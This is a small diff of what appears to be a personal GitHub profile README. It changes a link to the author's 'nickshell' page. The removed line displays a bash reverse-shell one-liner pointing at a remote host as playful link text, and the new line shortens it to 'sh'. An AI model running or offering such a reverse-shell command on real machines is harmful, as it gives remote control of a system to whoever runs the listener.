@@ -22,7 +22,7 @@ Here are some ideas to get you started:
 I have a strong background in computer science and love applying the skills from class to projects like these! <br>
 More cybersecurity-related projects coming soon! <br>
 
-👀 <a href="https://chnnick.github.io/nickshell/">bash -i >& /dev/tcp/chnnick.github.io/443 0>&1</a>
+👀 <a href="https://chnnick.github.io/nickshell/">sh</a>
 
 
 
